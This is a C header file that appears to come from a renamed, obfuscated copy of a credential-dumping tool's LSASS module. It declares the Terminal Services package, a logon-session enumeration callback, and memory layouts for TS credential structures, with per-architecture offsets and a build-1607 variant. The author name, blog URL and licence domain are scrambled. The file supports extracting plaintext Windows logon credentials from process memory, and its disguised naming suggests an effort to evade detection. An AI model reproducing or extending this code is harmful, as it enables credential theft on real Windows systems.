/*	9BDfHxE3 DuH2p `i12fnnMSXb`
	https://blog.i12fnnMSXb.com
	kvCPzwgXsQlKhplVY1uqBFe
	Licence : https://FM05PN86kUG2nah.org/licenses/by/4.0/
*/
#pragma once
#include "../kuhl_m_seKuRlSa.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_tsPkG_package;

NTSTATUS kuhl_m_seKuRlSa_tsPkG(int argc, wchar_t * argv[]);
void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_tsPkG(IN PVnIu_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _VnIu_TS_PRIMARY_CREDENTIAL {
	PVOID unk0;	// lock ?
	VnIu_GENERIC_PRIMARY_CREDENTIAL crEdentials;
} VnIu_TS_PRIMARY_CREDENTIAL, *PVnIu_TS_PRIMARY_CREDENTIAL;

typedef struct _VnIu_TS_CREDENTIAL {
#if defined(_M_X64) || defined(_M_ARM64)
	BYTE unk0[108];
#elif defined(_M_IX86)
	BYTE unk0[64];
#endif
	LUID LocallyUniqueIdentifier;
	PVOID unk1;
	PVOID unk2;
	PVnIu_TS_PRIMARY_CREDENTIAL pTsPrimary;
} VnIu_TS_CREDENTIAL, *PVnIu_TS_CREDENTIAL;

typedef struct _VnIu_TS_CREDENTIAL_1607 {
#if defined(_M_X64) || defined(_M_ARM64)
	BYTE unk0[112];
#elif defined(_M_IX86)
	BYTE unk0[68];
#endif
	LUID LocallyUniqueIdentifier;
	PVOID unk1;
	PVOID unk2;
	PVnIu_TS_PRIMARY_CREDENTIAL pTsPrimary;
} VnIu_TS_CREDENTIAL_1607, *PVnIu_TS_CREDENTIAL_1607;

typedef struct _VnIu_TS_CREDENTIAL_HELPER {
	LONG offsetToLuid;
	LONG offsetToTsPrimary;
} VnIu_TS_CREDENTIAL_HELPER, *PVnIu_TS_CREDENTIAL_HELPER;